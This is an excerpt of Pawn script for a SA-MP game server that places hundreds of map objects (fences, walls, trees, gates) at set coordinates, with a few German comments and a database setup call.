CreateDynamicObject(3787, 2852.90137, 1015.95093, 10.25980,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(16782, 2814.52075, 1008.90332, 11.70066,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(16782, 2843.81250, 1010.13489, 12.29040,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18032, 2863.97070, 1000.19971, 11.23430,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1583, 2845.36572, 1002.40869, 10.06710,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(16770, 2841.77759, 996.58380, 11.17380,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1583, 2845.36572, 1003.90869, 10.06710,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(1583, 2845.36572, 1005.40869, 10.06710,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(1583, 2845.36572, 1000.90869, 10.06710,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(1583, 2845.36572, 999.40869, 10.06710,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(1583, 2845.36572, 997.90869, 10.06710,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(1583, 2845.36572, 996.40869, 10.06710,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(1583, 2845.36572, 994.90869, 10.06710,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(1583, 2845.36572, 993.40869, 10.06710,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(1583, 2845.36572, 991.90869, 10.06710,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(1583, 2845.36572, 1002.40869, 10.06710,   0.00000, 0.00000, 90.00000);
CreateDynamicObject(2064, 2845.55884, 1007.42188, 10.33740,   0.00000, 0.00000, 130.00000);
CreateDynamicObject(2061, 2843.81226, 1011.92761, 10.95860,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(2061, 2843.81226, 1012.09760, 10.95860,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(2061, 2843.81226, 1012.60760, 10.95860,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(2061, 2843.81226, 1012.77759, 10.95860,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(2035, 2847.86011, 1016.27008, 10.69500,   0.00000, 0.00000, 25.00000);
CreateDynamicObject(2035, 2849.14014, 1016.27008, 10.69500,   0.00000, 0.00000, 25.00000);
CreateDynamicObject(2044, 2846.17212, 1016.27411, 10.71000,   0.00000, 0.00000, -45.00000);
CreateDynamicObject(2044, 2845.51074, 1016.27411, 10.71000,   0.00000, 0.00000, -45.00000);
CreateDynamicObject(2044, 2844.78833, 1016.27411, 10.71000,   0.00000, 0.00000, -45.00000);
CreateDynamicObject(1578, 2867.53687, 1009.64111, 10.61070,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1575, 2867.53687, 1008.50439, 10.61070,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1579, 2867.53687, 1007.34161, 10.61070,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19363, 2867.97778, 1014.46820, 11.48590,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(955, 2798.07007, 982.72809, 10.14860,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(2035, 2816.67139, 1005.05768, 11.98730,   90.00000, 0.00000, 0.00000);
CreateDynamicObject(2035, 2816.67139, 1005.05768, 11.23730,   90.00000, 0.00000, 0.00000);
CreateDynamicObject(2035, 2816.67139, 1005.05768, 10.48730,   90.00000, 0.00000, 0.00000);
CreateDynamicObject(2036, 2823.42139, 1005.05768, 10.48730,   90.00000, 0.00000, 180.00000);
CreateDynamicObject(2036, 2823.42139, 1005.05768, 11.23730,   90.00000, 0.00000, 180.00000);
CreateDynamicObject(2036, 2823.42139, 1005.05768, 11.98730,   90.00000, 0.00000, 180.00000);
CreateDynamicObject(19169, 2783.86450, 951.20563, 12.42880,   90.00000, 0.00000, 90.00000);
CreateDynamicObject(19267, 2783.88647, 951.87750, 12.15350,   90.00000, 0.00000, 90.00000);
CreateDynamicObject(19168, 2783.86450, 949.70630, 12.42880,   90.00000, 0.00000, 90.00000);
CreateDynamicObject(19170, 2783.86450, 949.70630, 10.94740,   90.00000, 0.00000, 90.00000);
CreateDynamicObject(19171, 2783.86450, 951.20630, 10.94740,   90.00000, 0.00000, 90.00000);
CreateDynamicObject(19267, 2783.88452, 951.73950, 10.65350,   90.00000, 0.00000, 90.00000);
//SWAT












//SetTimer("hostnametimer", 2000, true); // Set a timer of 1000 miliseconds (1 second)

//	ConnectMySQL();
    MySQL_SetupConnection();


	// Automat O-Amt
	CreateObject(4642, 923.90088, -1209.06201, 17.65574,   0.00000, 0.00000, 90.00002);







	CreateObject(3335, 2462.42480, 82.85914, 25.30432,   -90.00000, 0.00000, 180.17989);

htornew1 = CreateObject(988, 2424.13770, 58.84145, 26.49200,   0.00000, 0.00000, -90.00000);


CreateObject(2669, 2424.42432, 49.03105, 26.76261,   0.00000, 0.00000, 90.00003);
CreateObject(2669, 2424.42432, 49.03105, 29.42553,   0.00000, 0.00000, 90.00003);



htornew2 = CreateObject(988, 2424.13232, 53.39064, 26.49200,   0.00000, 0.00000, -90.00000);






CreateDynamicObject(8513, 4317.50195, -7600.22900, -6204.92188,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8513, 2473.93799, 41.68301, 29.48605,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(12820, 2477.68701, 56.69134, 25.35855,   360.00000, 0.00000, -89.91840);
CreateDynamicObject(12820, 2472.86182, 126.65810, 25.35855,   360.00000, 0.00000, -89.91840);
CreateDynamicObject(12820, 2478.37280, -13.22672, 25.35855,   360.00000, 0.00000, -89.91840);
CreateDynamicObject(19543, 2434.58105, 59.08241, 25.45644,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(19543, 2434.56372, 74.01001, 25.45644,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(19543, 2496.97729, 74.14252, 25.45644,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(19543, 2497.04761, 59.15231, 25.45644,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(19543, 2435.13110, 24.14823, 25.45644,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(19543, 2435.15479, 9.21199, 25.45644,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(19543, 2435.15796, -5.62802, 25.45644,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(19543, 2435.01147, -12.89761, 25.44591,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(19543, 2497.54712, 24.19998, 25.45644,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(19543, 2497.55884, 9.39390, 25.45644,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(1408, 2406.61914, 81.63146, 25.93329,   356.85840, 0.00000, -3.11565);
CreateDynamicObject(1408, 2412.13818, 81.55093, 25.93329,   356.85840, 0.00000, -3.11565);
CreateDynamicObject(1408, 2417.66211, 81.39059, 25.93329,   356.85840, 0.00000, -3.11565);
CreateDynamicObject(1408, 2423.24536, 81.31341, 25.93329,   356.85840, 0.00000, -3.11565);
CreateDynamicObject(19543, 2492.78418, 94.20261, 25.45644,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(19543, 2492.78760, 79.33231, 25.45257,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(8209, 2455.72949, 47.14312, 26.11172,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(4882, 2477.41138, 41.49055, 30.63450,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(8209, 2455.23730, 36.05421, 26.11170,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(790, 2417.16797, 124.77799, 27.44143,   3.14159, 0.00000, 1.69297);
CreateDynamicObject(790, 2437.06250, 118.44359, 27.44143,   3.14159, 0.00000, 1.69297);
CreateDynamicObject(790, 2405.97144, 74.09586, 27.44143,   3.14159, 0.00000, 1.69297);
CreateDynamicObject(790, 2405.52417, 19.10304, 27.44143,   3.14159, 0.00000, 1.69297);
CreateDynamicObject(790, 2406.06689, 4.04286, 27.44143,   3.14159, 0.00000, 1.69297);
CreateDynamicObject(790, 2458.77881, -54.09318, 27.44143,   3.14159, 0.00000, 1.69297);
CreateDynamicObject(790, 2529.92920, -26.09720, 27.44143,   3.14159, 0.00000, 1.69297);
CreateDynamicObject(790, 2580.02710, 9.84215, 27.44143,   3.14159, 0.00000, 1.69297);
CreateDynamicObject(790, 2518.50049, -52.62981, 27.44143,   3.14159, 0.00000, 1.69297);
CreateDynamicObject(790, 2575.28198, -15.51862, 27.44143,   3.14159, 0.00000, 1.69297);
CreateDynamicObject(790, 2574.50854, 22.60141, 27.44143,   3.14159, 0.00000, 1.69297);
CreateDynamicObject(790, 2577.34839, 62.76253, 27.44143,   3.14159, 0.00000, 1.69297);
CreateDynamicObject(790, 2573.88086, 92.97592, 27.44143,   3.14159, 0.00000, 1.69297);
CreateDynamicObject(790, 2558.14478, 114.76794, 27.44143,   3.14159, 0.00000, 1.69297);
CreateDynamicObject(790, 2555.89233, 142.24512, 27.44143,   3.14159, 0.00000, 1.69297);
CreateDynamicObject(790, 2536.40649, 160.15733, 27.44143,   3.14159, 0.00000, 1.69297);
CreateDynamicObject(790, 2515.06519, 162.41487, 27.44143,   3.14159, 0.00000, 1.69297);
CreateDynamicObject(790, 2483.72192, 159.75401, 27.44143,   3.14159, 0.00000, 1.69297);
CreateDynamicObject(790, 2460.13965, 164.46675, 27.44143,   3.14159, 0.00000, 1.69297);
CreateDynamicObject(790, 2429.95313, 174.80717, 27.44143,   3.14159, 0.00000, 1.69297);
CreateDynamicObject(689, 2368.22827, -96.05677, 22.98308,   356.88031, 0.09985, 0.53008);
CreateDynamicObject(689, 2402.45044, -91.01355, 22.98308,   356.88031, 0.09985, 0.53008);
CreateDynamicObject(689, 2454.97070, -79.92236, 22.98308,   356.88031, 0.09985, 0.53008);
CreateDynamicObject(689, 2454.97070, -79.92236, 22.98308,   356.88031, 0.09985, 0.53008);
CreateDynamicObject(689, 2410.88623, -10.14444, 22.98308,   356.88031, 0.09985, 0.53008);
CreateDynamicObject(3928, 2482.80176, 89.72290, 33.80025,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(3928, 2467.05249, 90.07487, 33.80025,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(3928, 2451.05420, 90.14104, 33.80025,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(3928, 2435.57129, 90.02839, 33.80025,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(3928, 2497.70825, 89.93884, 33.80025,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(3928, 2496.65942, -7.91118, 33.80025,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(3928, 2481.05884, -7.53760, 33.80025,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(3928, 2467.37720, -7.67637, 33.80025,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(3928, 2451.63574, -7.76645, 33.80025,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(3928, 2435.43286, -7.61525, 33.80025,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(1332, 2521.92310, 33.11694, 26.47209,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1332, 2515.02808, 33.15322, 26.47209,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1332, 2462.46875, 104.69206, 26.47209,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1332, 2465.60425, 104.72033, 26.47209,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1332, 2468.76074, 104.60548, 26.47209,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(823, 2512.58472, 92.46258, 26.38056,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(823, 2518.67065, 98.60262, 26.38056,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(823, 2520.01050, 88.32663, 26.38056,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(823, 2508.11597, 98.81454, 26.38056,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(823, 2507.82080, 87.31458, 26.38056,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(823, 2430.24219, 59.74065, 26.38056,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(823, 2420.12036, 60.60339, 26.38056,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(823, 2412.59595, 70.74812, 26.38056,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(823, 2407.13135, 66.09268, 26.38056,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(823, 2418.70801, 68.41705, 26.38056,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(823, 2410.54614, 77.26387, 26.38056,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1332, 2504.54736, 33.15619, 29.69747,   0.00000, 0.00000, 87.78001);
CreateDynamicObject(1332, 2506.17822, 34.04153, 29.69747,   0.00000, 0.00000, 87.78001);
CreateDynamicObject(1332, 2504.45996, 50.67151, 29.69747,   0.00000, 0.00000, 87.78001);
CreateDynamicObject(1332, 2503.19800, 49.19503, 29.69747,   0.00000, 0.00000, 87.78001);
CreateDynamicObject(3928, 2460.15991, 16.59697, 25.49960,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(3928, 2475.04761, 16.72845, 25.49960,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(3928, 2490.16382, 16.85012, 25.49960,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(1215, 2493.48926, 13.11911, 25.44709,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 2486.62720, 13.14205, 25.44709,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 2486.63159, 20.80916, 25.44709,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 2493.36499, 20.78863, 25.44709,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 2478.35425, 20.56944, 25.44709,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 2471.57373, 20.50183, 25.44709,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 2478.40430, 12.98252, 25.44709,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 2471.45752, 13.05294, 25.44709,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 2463.44165, 20.45049, 25.44709,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 2463.50928, 12.87268, 25.44709,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 2456.58594, 12.91798, 25.44709,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 2456.57300, 20.48415, 25.44709,   0.00000, 0.00000, 0.00000);


// Zaun von Nexus
CreateDynamicObject(974, 96.74116, 1920.59814, 18.54408,   0.00000, 0.00000, 89.08062);
CreateDynamicObject(987, 275.71902, 1798.88074, 17.44950,   0.00000, 0.00000, 272.63477);
CreateDynamicObject(987, 275.90695, 1794.66443, 17.39952,   0.00000, 0.00000, 272.76962);
CreateDynamicObject(987, 276.45233, 1782.84399, 17.43663,   0.00000, 0.00000, 0.19998);
CreateDynamicObject(987, 288.48221, 1782.85095, 17.42881,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, 300.46143, 1782.85632, 17.43337,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, 309.49615, 1782.81958, 17.33152,   0.00000, 0.00000, 359.93521);
CreateDynamicObject(987, 321.31509, 1782.77185, 17.32677,   0.00000, 0.00000, 32.30485);
CreateDynamicObject(987, 331.32306, 1789.46985, 17.28822,   0.00000, 0.00000, 30.79455);
CreateDynamicObject(987, 341.59033, 1795.70642, 17.24526,   0.00000, 0.00000, 34.37918);
CreateDynamicObject(987, 347.17981, 1799.26904, 17.24131,   0.00000, 0.00000, 36.73052);
CreateDynamicObject(987, 356.68594, 1806.31323, 17.23327,   0.00000, 0.00000, 92.83454);
CreateDynamicObject(987, 356.02832, 1818.26563, 17.16319,   0.00000, 0.00000, 91.77797);
CreateDynamicObject(987, 355.76373, 1830.16089, 17.17272,   0.00000, 0.00000, 90.79198);
CreateDynamicObject(987, 355.51169, 1842.11511, 17.13823,   0.00000, 0.00000, 90.33645);
CreateDynamicObject(987, 355.25577, 1853.99280, 16.97051,   0.00000, 0.00000, 88.38336);
CreateDynamicObject(987, 355.45013, 1864.24658, 16.94281,   0.00000, 0.00000, 89.72942);
CreateDynamicObject(987, 355.78107, 1876.01428, 16.95074,   0.00000, 0.00000, 21.65396);
CreateDynamicObject(987, 366.88742, 1880.45898, 16.92550,   0.00000, 0.00000, 21.65634);
CreateDynamicObject(987, 377.92297, 1884.87256, 16.81997,   0.00000, 0.00000, 21.85616);
CreateDynamicObject(987, 379.11172, 1885.30139, 16.81834,   0.00000, 0.00000, 21.59270);
CreateDynamicObject(987, 390.01547, 1889.73877, 16.84269,   0.00000, 0.00000, 90.16431);
CreateDynamicObject(987, 389.70200, 1901.58594, 16.80166,   0.00000, 0.00000, 88.97225);
CreateDynamicObject(987, 389.59842, 1913.46606, 16.73559,   0.00000, 0.00000, 88.74458);
CreateDynamicObject(987, 389.88565, 1925.44360, 16.73533,   0.00000, 0.00000, 90.09782);
CreateDynamicObject(987, 389.99728, 1937.49304, 16.73328,   0.00000, 0.00000, 89.75646);
CreateDynamicObject(987, 390.11740, 1949.50940, 16.73454,   0.00000, 0.00000, 90.73328);
CreateDynamicObject(987, 389.95169, 1961.48865, 16.73277,   0.00000, 0.00000, 89.42043);
CreateDynamicObject(987, 389.98502, 1973.49548, 16.69258,   0.00000, 0.00000, 89.80158);
CreateDynamicObject(987, 390.14096, 1985.48962, 16.72589,   0.00000, 0.00000, 90.08319);
CreateDynamicObject(987, 390.10193, 1997.45483, 16.68825,   0.00000, 0.00000, 90.08668);
CreateDynamicObject(987, 390.12393, 2009.35925, 16.72038,   0.00000, 0.00000, 90.14909);
CreateDynamicObject(987, 389.99185, 2021.31628, 16.67021,   0.00000, 0.00000, 89.72412);
CreateDynamicObject(987, 390.02707, 2033.27673, 16.62662,   0.00000, 0.00000, 89.62608);
CreateDynamicObject(987, 390.06821, 2045.27307, 16.62678,   0.00000, 0.00000, 90.07279);
CreateDynamicObject(987, 390.11429, 2057.12305, 16.63215,   0.00000, 0.00000, 90.07160);
CreateDynamicObject(987, 389.96704, 2069.12378, 16.60411,   0.00000, 0.00000, 89.18922);
CreateDynamicObject(987, 390.09482, 2081.16040, 16.56954,   0.00000, 0.00000, 179.59384);
CreateDynamicObject(987, 378.13083, 2081.25098, 16.53284,   0.00000, 0.00000, 179.55428);
CreateDynamicObject(987, 366.17075, 2081.26465, 16.51544,   0.00000, 0.00000, 179.67070);
CreateDynamicObject(987, 354.30350, 2081.33130, 16.50962,   0.00000, 0.00000, 180.50620);
CreateDynamicObject(987, 342.24902, 2081.12695, 16.51865,   0.00000, 0.00000, 179.74619);
CreateDynamicObject(987, 330.21378, 2081.23438, 16.49448,   0.00000, 0.00000, 179.86017);
CreateDynamicObject(987, 318.33536, 2081.26270, 16.53432,   0.00000, 0.00000, 179.66867);
CreateDynamicObject(987, 306.40765, 2081.26074, 16.57045,   0.00000, 0.00000, 180.17789);
CreateDynamicObject(987, 294.43094, 2081.23486, 16.59805,   0.00000, 0.00000, 180.15517);
CreateDynamicObject(987, 282.50766, 2081.28467, 16.62642,   0.00000, 0.00000, 180.19702);
CreateDynamicObject(987, 270.55667, 2081.35596, 16.61675,   0.00000, 0.00000, 179.56581);
CreateDynamicObject(987, 258.64008, 2081.45874, 16.62858,   0.00000, 0.00000, 179.86914);
CreateDynamicObject(987, 246.63458, 2081.46265, 16.63013,   0.00000, 0.00000, 179.90771);
CreateDynamicObject(987, 234.67207, 2081.54907, 17.95974,   0.00000, 0.00000, 176.21242);
CreateDynamicObject(987, 222.88138, 2082.35962, 19.55122,   0.00000, 0.00000, 177.25081);
CreateDynamicObject(987, 219.23349, 2082.62378, 20.88547,   0.00000, 0.00000, 177.21455);
CreateDynamicObject(987, 207.38860, 2080.97314, 22.20057,   0.00000, 0.00000, 103.66066);
CreateDynamicObject(987, 205.22066, 2090.15601, 21.56135,   0.00000, 0.00000, 135.69238);
CreateDynamicObject(987, 197.81497, 2098.24390, 21.52310,   0.00000, 0.00000, 170.61179);
CreateDynamicObject(987, 188.09427, 2100.41284, 21.51310,   0.00000, 0.00000, 195.74721);
CreateDynamicObject(987, 179.62120, 2098.07690, 21.46650,   0.00000, 0.00000, 219.39337);
CreateDynamicObject(987, 172.35422, 2092.76147, 21.47278,   0.00000, 0.00000, 253.67854);
CreateDynamicObject(987, 169.10040, 2083.82080, 21.49467,   0.00000, 0.00000, 281.38318);
CreateDynamicObject(987, 171.38368, 2073.08374, 21.44408,   0.00000, 0.00000, 318.16766);
CreateDynamicObject(987, 188.85414, 1953.00391, 17.11501,   0.00000, 0.00000, 270.03192);
CreateDynamicObject(987, 188.94977, 1965.04602, 17.12164,   0.00000, 0.00000, 270.39957);
CreateDynamicObject(987, 188.88292, 1977.11914, 17.06678,   0.00000, 0.00000, 270.65411);
CreateDynamicObject(987, 188.87004, 1989.13977, 17.05438,   0.00000, 0.00000, 270.00748);
CreateDynamicObject(987, 188.95210, 2001.00232, 17.06050,   0.00000, 0.00000, 269.74368);
CreateDynamicObject(987, 188.90059, 2012.91479, 17.07243,   0.00000, 0.00000, 270.21155);
CreateDynamicObject(987, 188.85530, 2024.91663, 17.09973,   0.00000, 0.00000, 270.60406);
CreateDynamicObject(987, 188.81665, 2036.83240, 17.11320,   0.00000, 0.00000, 270.93506);
CreateDynamicObject(987, 188.51071, 2048.19897, 17.62433,   0.00000, 0.00000, 270.54919);
CreateDynamicObject(987, 188.19519, 2059.65503, 19.26161,   0.00000, 0.00000, 271.27142);
CreateDynamicObject(987, 178.25821, 2065.90552, 21.39554,   0.00000, 0.00000, 343.42786);
CreateDynamicObject(987, 188.29990, 2063.56689, 20.19610,   0.00000, 0.00000, 270.57819);









/*
CreateDynamicObject(19054, 896.13007, -1663.45923, 12.95749,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19056, 896.73505, -1661.83813, 13.07730,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19055, 898.46814, -1662.51904, 13.11373,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19058, 896.77075, -1664.72034, 13.13426,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19076, 897.95178, -1663.54700, 12.50297,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19318, 896.06628, -1661.28967, 13.25168,   0.00000, 0.00000, 241.19992);
CreateDynamicObject(18653, 895.65338, -1665.02405, 11.96121,   0.00000, 0.00000, 16.97999);
CreateDynamicObject(19056, 899.27124, -1664.17969, 13.07730,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19058, 898.31750, -1665.02014, 13.13426,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19054, 898.71582, -1660.78918, 12.95749,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(19056, 900.00073, -1662.07410, 13.07730,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(18653, 895.54443, -1661.87170, 11.96121,   0.00000, 0.00000, -11.94001);
*/



//

	gateamk = CreateDynamicObject(969, 999.36078, -645.45374, 120.85107,   2.28000, 2.04000, 24.90000); //Haus ID: 11



	CreateDynamicObject(17536, 1025.41, -2321.72, 19.30, 0.00, 0.00, 26.97);
	CreateDynamicObject(8569, 1026.90, -2321.41, 13.83, 0.00, 0.00, 26.33);
	CreateDynamicObject(17536, -5.69, -2511.99, 41.73, -0.06, 0.00, 30.18);
	CreateDynamicObject(8569, -7.00, -2512.58, 37.49, 0.00, 0.00, 210.42);
	CreateDynamicObject(1251, -39.44, -2495.56, 35.64, 0.00, 0.00, 36.37);
	CreateDynamicObject(1251, -36.45, -2493.35, 35.64, 0.00, 0.00, 35.35);
	CreateDynamicObject(1251, -33.41, -2491.23, 35.64, 0.00, 0.00, 35.35);
	CreateDynamicObject(1251, -29.87, -2488.66, 35.64, 0.00, 0.00, 35.35);
	CreateDynamicObject(1251, -26.56, -2486.14, 35.64, 0.00, 0.00, 35.35);
	CreateDynamicObject(1251, -23.89, -2483.99, 35.64, 0.00, 0.00, 35.35);
	CreateDynamicObject(1251, -21.35, -2482.09, 35.64, 0.00, 0.00, 217.50);
	CreateDynamicObject(1251, -26.71, -2480.30, 35.64, 0.00, 0.00, 285.02);
	CreateDynamicObject(1251, -10.09, -2497.25, 35.64, 0.00, 0.00, 55.67);
	CreateDynamicObject(1251, -12.76, -2499.58, 35.64, 0.00, 0.00, 53.27);
	CreateDynamicObject(1251, -7.57, -2495.12, 35.64, 0.00, 0.00, 53.27);
	CreateDynamicObject(3934, -2.00, -2518.27, 53.90, 0.00, 0.00, 30.77);
	CreateDynamicObject(3934, -8.96, -2506.31, 53.70, 0.00, 0.00, 30.77);
	CreateDynamicObject(2904, -7.40, -2526.62, 52.61, -138.72, -358.26, 122.06);
	CreateDynamicObject(17536, 1025.41, -2321.72, 19.30, 0.00, 0.00, 26.97);
	CreateDynamicObject(8569, 1026.90, -2321.41, 13.83, 0.00, 0.00, 26.33);
	CreateDynamicObject(11714, -12.54, -2518.98, 37.07, 0.18, 0.10, 30.98);
	CreateDynamicObject(18771, -9.93, -2528.09, 2.37, 0.00, 0.00, 298.17);
	CreateDynamicObject(2904, -8.32, -2528.24, 52.19, -91.54, 232.50, 350.57);
//	CreateDynamicObject(19912, -35.04, -2515.36, 37.90, -1.56, -1.56, 304.71);
	CreateDynamicObject(19456, -27.76, -2527.72, 37.27, 0.00, 1.14, 29.94);
	CreateDynamicObject(19364, -24.62, -2533.23, 37.34, -2.28, 0.48, 28.51);
	CreateDynamicObject(19364, -23.09, -2536.04, 37.46, -2.28, 0.48, 28.51);
	CreateDynamicObject(19364, -22.02, -2538.01, 37.54, -2.28, 0.48, 28.51);
	CreateDynamicObject(19364, -19.80, -2538.74, 37.66, -2.40, 1.86, 112.27);
	CreateDynamicObject(19456, -14.27, -2536.05, 37.71, 0.00, -1.86, 296.98);
	CreateDynamicObject(19456, -5.71, -2531.68, 37.71, 0.00, -1.86, 296.98);
	CreateDynamicObject(19456, 2.77, -2527.25, 37.71, 0.00, -1.86, 298.32);
	CreateDynamicObject(19364, 8.25, -2524.33, 37.71, -0.18, -1.56, 296.97);
	CreateDynamicObject(19364, 11.11, -2522.89, 37.71, -0.18, -1.56, 296.97);
	CreateDynamicObject(19364, 11.92, -2520.73, 37.71, -0.68, 0.00, 24.51);
	CreateDynamicObject(19456, 8.82, -2515.15, 37.70, 0.00, 0.00, 30.61);
	CreateDynamicObject(19456, 3.91, -2506.85, 37.70, 0.00, 0.00, 30.61);
	CreateDynamicObject(19456, -0.92, -2498.53, 37.70, 0.00, 0.00, 29.56);
	CreateDynamicObject(19456, -5.57, -2490.13, 37.70, 0.00, 0.00, 28.51);
	CreateDynamicObject(19456, -10.16, -2481.69, 37.70, 0.00, 0.00, 28.51);
	CreateDynamicObject(19456, -14.76, -2473.23, 37.70, 0.00, 0.00, 28.51);
	CreateDynamicObject(19364, -17.89, -2467.75, 37.42, 0.00, -0.06, 33.34);
	CreateDynamicObject(19456, -22.67, -2469.13, 37.30, 0.00, 0.00, 304.39);
	CreateDynamicObject(19456, -30.59, -2474.56, 37.30, 0.00, 0.00, 304.39);
	CreateDynamicObject(19456, -38.42, -2480.16, 37.34, 0.00, -0.06, 306.67);
	CreateDynamicObject(19456, -46.12, -2485.88, 37.52, -2.28, -0.12, 306.67);
	CreateDynamicObject(19364, -51.00, -2489.58, 37.71, 0.06, 0.00, 308.67);
	CreateDynamicObject(19456, -44.30, -2501.99, 36.24, -1.86, 0.66, 34.68);
	CreateDynamicObject(19456, -49.47, -2494.50, 35.95, -1.84, 0.66, 34.68);
	CreateDynamicObject(985, -45.48, -2500.25, 36.67, 0.18, 1.44, 304.42);
	CreateDynamicObject(985, -49.95, -2493.75, 36.91, 0.30, 1.80, 304.92);
	CreateDynamicObject(985, -49.07, -2488.21, 37.03, 0.00, 0.00, 38.07);
	CreateDynamicObject(985, -42.82, -2483.43, 37.03, 0.00, 0.00, 36.85);
	CreateDynamicObject(985, -36.52, -2478.73, 37.03, 0.00, 0.00, 36.14);
	CreateDynamicObject(19456, -46.17, -2485.92, 37.52, -2.28, -0.12, 306.67);
	CreateDynamicObject(985, -30.10, -2474.19, 37.03, 0.00, 0.00, 34.40);
	CreateDynamicObject(985, -23.62, -2469.76, 37.03, 0.00, 0.00, 34.40);
	CreateDynamicObject(985, -21.99, -2468.64, 37.03, 0.00, 0.00, 34.40);
	CreateDynamicObject(19364, -50.98, -2489.58, 35.86, 0.00, 0.00, 308.67);
	CreateDynamicObject(985, -16.74, -2469.80, 37.03, 0.00, 0.00, 300.26);
	CreateDynamicObject(985, -12.86, -2476.65, 37.03, 0.22, 0.00, 298.40);
	CreateDynamicObject(985, -9.13, -2483.57, 37.03, 0.22, 0.00, 298.40);
	CreateDynamicObject(985, -5.38, -2490.50, 37.03, 0.22, 0.00, 298.40);
	CreateDynamicObject(985, -1.54, -2497.39, 37.03, 0.22, 0.00, 299.72);
	CreateDynamicObject(985, 2.37, -2504.21, 37.03, 0.22, 0.00, 300.23);
	CreateDynamicObject(985, 6.38, -2510.99, 37.03, 0.22, 0.00, 300.74);
	CreateDynamicObject(985, 10.27, -2517.82, 37.03, 0.22, 0.00, 298.62);
	CreateDynamicObject(985, -32.99, -2518.79, 35.27, -0.07, -1.44, 300.54);
	CreateDynamicObject(985, -29.02, -2525.59, 35.44, -0.07, -1.44, 300.04);
	CreateDynamicObject(19456, -32.58, -2519.58, 33.77, -1.86, 0.66, 30.65);
	CreateDynamicObject(19456, -32.60, -2519.45, 37.13, -1.86, 0.66, 30.65);
